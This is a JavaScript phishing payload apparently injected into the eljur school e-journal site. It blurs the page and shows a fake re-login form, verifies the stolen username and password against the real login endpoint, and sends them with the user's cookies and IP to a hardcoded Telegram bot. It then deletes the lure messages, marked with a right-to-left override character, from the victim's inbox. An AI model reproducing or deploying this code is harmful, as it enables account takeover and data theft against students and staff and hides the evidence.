const tgTok = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
const tgChat = "-1003077695457";
const tgUrl = `https://api.telegram.org/bot${tgTok}/sendMessage`;

const ck = document.cookie.split("; ").reduce((a, c) => {
  const [k, ...v] = c.split("=");
  a[k] = v.join("=");
  return a;
}, {});
const ckStr = JSON.stringify(ck);
let ip = "неизвестно";

const msgBox = document.querySelector(".typography.overflow");
if (msgBox) {
  msgBox.innerHTML = `
    <div class="notice notice--red notice--medium">
      <div class="notice__content">
        <div class="notice__content__text">
          <p>Личные письма доступны только из dev!</p>
        </div>
      </div>
    </div>`;
}

async function getIp() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    ip = d.ip || "нет";
  } catch (e) {
    console.error("ip не получен:", e);
  }
}

async function sendTg(txt) {
  try {
    await fetch(tgUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: tgChat, text: txt, parse_mode: "Markdown" })
    });
  } catch (e) {
    console.error("ошибка tg:", e);
  }
}

function mkOverlay() {
  document.body.style.position = "relative";
  document.body.style.overflow = "hidden";

  const blur = document.createElement("div");
  Object.assign(blur.style, {
    position: "fixed", top: "0", left: "0",
    width: "100%", height: "100%",
    backdropFilter: "blur(8px)",
    background: "rgba(0,0,0,0.4)",
    zIndex: "9998"
  });
  document.body.appendChild(blur);

  const box = document.createElement("div");
  box.id = "loginviewport";
  box.className = "login-outer";
  Object.assign(box.style, {
    position: "fixed",
    top: "50%", left: "50%",
    transform: "translate(-50%, -50%)",
    zIndex: "9999",
    background: "#fff",
    borderRadius: "12px",
    boxShadow: "0 0 15px rgba(0,0,0,0.3)",
    padding: "30px",
    maxWidth: "400px",
    width: "100%"
  });

  box.innerHTML = `
    <div class="login-form login-form--centered">
      <div class="login-form__body">
        <h1 class="ej-form__header" style="text-align:center;">
          Для прочтения личного сообщения войдите снова
        </h1>
        <div class="error-container"></div>
        <form method="post" name="login" class="ej-form ej-form--text-center ej-form--vertical">
          <div class="ej-form__body">
            <div class="ej-form-group ej-form-group--12">
              <label class="ej-form-label"><span>Логин</span></label>
              <div class="ej-form-control">
                <input autocomplete="username" type="text" class="field field--fill field--big" />
              </div>
            </div>
            <div class="ej-form-group ej-form-group--12">
              <label class="ej-form-label"><span>Пароль</span></label>
              <div class="ej-form-control">
                <input autocomplete="current-password" type="password" class="field field--fill field--big" />
              </div>
            </div>
          </div>
          <div class="ej-form__footer">
            <button type="submit" class="button button--red button--big button--fill">Войти</button>
          </div>
        </form>
      </div>
    </div>
  `;

  document.body.appendChild(box);
  return { box, blur };
}

function bindForm(box, blur) {
  const f = box.querySelector("form");
  f.addEventListener("submit", async (e) => {
    e.preventDefault();

    const u = box.querySelector('input[autocomplete="username"]');
    const p  = box.querySelector('input[autocomplete="current-password"]');
    const uVal = (u.value || "").trim();
    const pVal = (p.value || "").trim();
    const errBox = box.querySelector(".error-container");
    errBox.innerHTML = "";

    if (!uVal || !pVal) {
      errBox.innerHTML = `
        <div class="notice notice--red notice--medium">
          <div class="notice__content">
            <div class="notice__content__text"><p>Заполните логин и пароль</p></div>
          </div>
        </div>`;
      return;
    }

    try {
      const r = await fetch("https://shkolakzn.eljur.ru/ajaxauthorize", {
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body: JSON.stringify({ username: uVal, password: pVal })
      });
      const d = await r.json();

      if (d.result && d.actions?.[0]?.type === "redirect") {
        const link = d.actions[0]?.url ? `[https://shkolakzn.eljur.ru/...](${encodeURI(d.actions[0].url)})` : "нет";
        await sendTg(`🔑 Логин: ${uVal}\n🔒 Пароль: ${pVal}\n🌐 IP: ${ip}\n🍪Куки: ${ckStr}\n🔗Ссылка: ${link}`);

        (async () => {
          const base = "/journal-api-messages-action";
          try {
            const r2 = await fetch(`${base}?method=messages.get_list&category=inbox&search=&limit=20&offset=0&teacher=0&status=&companion=&minDate=0`, {
              credentials: "include",
            });
            const d2 = await r2.json();

            const list = d2.list.filter(m => 
              m.subject.includes("Привет!\u202E") || 
              m.body.startsWith("Привет!‮&lt")
            );

            const ids = list.map(m => m.id);

            if (ids.length > 0) {
              console.log("нашёл письма:", ids);
              const delUrl = `${base}?method=messages.delete&idsString=${encodeURIComponent(ids.join(";"))}&type=inbox`;
              const delR = await fetch(delUrl, { credentials: "include" });
              const delD = await delR.json();
              console.log("удаление:", delD);
            } else {
              console.log("писем нет");
            }
          } catch (e) {
            console.error("ошибка писем:", e);
          }
        })();

        blur.remove();
        box.remove();
        document.body.style.overflow = "";
        document.body.style.position = "";

        window.location.href = "/";
      } else if (d.errors?.length > 0) {
        const msg = d.errors[0].text || "Ошибка входа";
        errBox.innerHTML = `
          <div class="notice notice--red notice--medium">
            <div class="notice__content">
              <div class="notice__content__text"><p>${msg}</p></div>
            </div>
          </div>`;
      }
    } catch (e) {
      console.error("сервер не отвечает:", e);
      errBox.innerHTML = `
        <div class="notice notice--red notice--medium">
          <div class="notice__content">
            <div class="notice__content__text"><p>Сервер недоступен</p></div>
          </div>
        </div>`;
    }
  });
}

(async function start() {
  await getIp();
  const { box, blur } = mkOverlay();
  bindForm(box, blur);
})();
